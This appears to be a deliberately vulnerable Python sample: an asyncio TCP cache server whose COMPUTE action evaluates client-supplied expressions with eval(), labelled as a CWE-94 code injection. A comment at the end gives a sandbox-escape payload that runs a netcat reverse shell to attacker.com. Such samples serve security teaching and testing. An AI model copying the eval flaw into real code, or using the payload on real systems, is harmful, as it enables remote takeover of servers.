import os
import json
import asyncio
import sqlite3
import logging
from datetime import datetime

# Configure logging for the Distributed Cache & Compute Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - ComputeNode - %(levelname)s - %(message)s'
)
logger = logging.getLogger("AsyncioCompute")

DB_FILE = "distributed_cache.db"
BIND_HOST = "0.0.0.0"
BIND_PORT = 8888

def init_cache_db():
    """Initializes the SQLite database for persistent key-value storage."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE kv_store (
            key_name TEXT PRIMARY KEY,
            value_data REAL NOT NULL,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    mock_data = [
        ('node_01_cpu', 45.5),
        ('node_01_mem', 1024.0),
        ('node_02_cpu', 88.2),
        ('node_02_mem', 2048.5),
        ('cluster_traffic_in', 5000.0)
    ]
    cursor.executemany('''
        INSERT INTO kv_store (key_name, value_data)
        VALUES (?, ?)
    ''', mock_data)

    conn.commit()
    conn.close()
    logger.info("Distributed cache database initialized with mock metrics.")

def get_cache_values(keys: list) -> list:
    """Retrieves multiple values from the cache database."""
    values = []
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        placeholders = ','.join('?' * len(keys))
        cursor.execute(f"SELECT value_data FROM kv_store WHERE key_name IN ({placeholders})", keys)
        for row in cursor.fetchall():
            values.append(row[0])
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error fetching keys: {e}")
    return values

def set_cache_value(key: str, value: float):
    """Inserts or updates a key-value pair in the cache."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO kv_store (key_name, value_data)
            VALUES (?, ?)
            ON CONFLICT(key_name) DO UPDATE SET
            value_data=excluded.value_data,
            updated_at=CURRENT_TIMESTAMP
        ''', (key, value))
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error setting key {key}: {e}")

def execute_map_reduce_job(keys: list, compute_expression: str) -> float:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: Raw TCP JSON payload -> 'expression' string evaluated via eval()
    """
    logger.info(f"Executing distributed compute job over {len(keys)} keys.")
    
    values_list = get_cache_values(keys)
    if not values_list:
        logger.warning("No valid values found for the provided keys.")
        return 0.0

    try:
        # Vulnerability: The compute node allows clients to send dynamic aggregation 
        # or transformation expressions over a raw TCP socket to process data locally 
        # before returning it. It uses Python's built-in eval() to execute this logic.
        # While the developer attempted to restrict the environment by clearing 
        # __builtins__, this sandbox is notoriously easy to escape using standard 
        # Python object traversal techniques, leading to Remote Code Execution (RCE).
        
        evaluation_context = {
            "values": values_list,
            "sum": sum,
            "max": max,
            "min": min,
            "len": len
        }
        
        # CWE-94 occurs instantly when the untrusted compute_expression is evaluated
        result = eval(compute_expression, {"__builtins__": {}}, evaluation_context)
        
        return float(result)
        
    except Exception as e:
        logger.error(f"Map-reduce compute job failed: {e}")
        return 0.0

async def handle_client_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """Handles incoming TCP RPC requests asynchronously."""
    addr = writer.get_extra_info('peername')
    logger.info(f"Accepted connection from {addr}")

    try:
        while True:
            data = await reader.readline()
            if not data:
                break

            payload_str = data.decode('utf-8').strip()
            if not payload_str:
                continue

            try:
                request = json.loads(payload_str)
                action = request.get("action")

                if action == "SET":
                    key = request.get("key")
                    val = request.get("value")
                    if key and val is not None:
                        set_cache_value(key, float(val))
                        response = {"status": "success", "message": "Key stored"}
                    else:
                        response = {"status": "error", "message": "Missing key or value"}

                elif action == "GET":
                    key = request.get("key")
                    vals = get_cache_values([key])
                    if vals:
                        response = {"status": "success", "value": vals[0]}
                    else:
                        response = {"status": "error", "message": "Key not found"}

                elif action == "COMPUTE":
                    keys = request.get("keys", [])
                    expression = request.get("expression", "")
                    if keys and expression:
                        # Pass the untrusted string directly to the vulnerable function
                        result = execute_map_reduce_job(keys, expression)
                        response = {"status": "success", "result": result}
                    else:
                        response = {"status": "error", "message": "Missing keys or expression"}
                else:
                    response = {"status": "error", "message": "Unknown action"}

            except json.JSONDecodeError:
                response = {"status": "error", "message": "Invalid JSON payload"}
            except ValueError:
                response = {"status": "error", "message": "Invalid data type"}

            writer.write((json.dumps(response) + "\n").encode('utf-8'))
            await writer.drain()

    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Error handling client {addr}: {e}")
    finally:
        logger.info(f"Closing connection from {addr}")
        writer.close()
        await writer.wait_closed()

async def start_server():
    """Starts the asyncio TCP server."""
    init_cache_db()
    server = await asyncio.start_server(handle_client_connection, BIND_HOST, BIND_PORT)
    
    addr = server.sockets[0].getsockname()
    logger.info(f"Serving distributed compute node on {addr}")

    async with server:
        await server.serve_forever()

if __name__ == '__main__':
    # Example Malicious Trigger:
    # 1. Attacker connects via netcat or a custom script to the raw TCP port:
    #    nc 127.0.0.1 8888
    # 2. Attacker sends a newline-terminated JSON payload targeting the COMPUTE action
    #    with a sandbox-escaping payload in the expression field:
    #
    #    {"action": "COMPUTE", "keys": ["node_01_cpu"], "expression": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"}
    #
    # 3. The server parses the JSON and evaluates the expression string, resulting in RCE.

    try:
        asyncio.run(start_server())
    except KeyboardInterrupt:
        logger.info("Shutting down Distributed Compute Node...")
